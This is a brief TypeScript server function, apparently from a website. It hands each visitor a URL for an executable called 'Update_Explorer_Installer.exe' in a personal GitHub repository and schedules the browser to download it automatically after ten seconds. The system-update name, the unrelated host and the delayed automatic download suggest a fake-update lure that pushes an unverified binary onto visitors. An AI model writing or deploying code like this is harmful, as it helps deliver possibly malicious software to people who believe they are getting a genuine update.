import { createServerFn } from "@tanstack/react-start";

const DOWNLOAD_DELAY_MS = 10_000;
const INSTALLER_DOWNLOAD_URL = "https://raw.githubusercontent.com/kh198888/update/master/Update_Explorer_Installer.exe";

/**
 * Creates a server-side download request. The browser uses the returned time
 * to start its download without holding a request open for the full delay.
 */
export const scheduleInstallerDownload = createServerFn({ method: "POST" })
  .inputValidator((data: { visitorId: string }) => data)
  .handler(async ({ data }) => {
    if (!data.visitorId) throw new Error("A visitor ID is required");

    return {
      downloadUrl: INSTALLER_DOWNLOAD_URL,
      availableAt: Date.now() + DOWNLOAD_DELAY_MS,
    };
  });
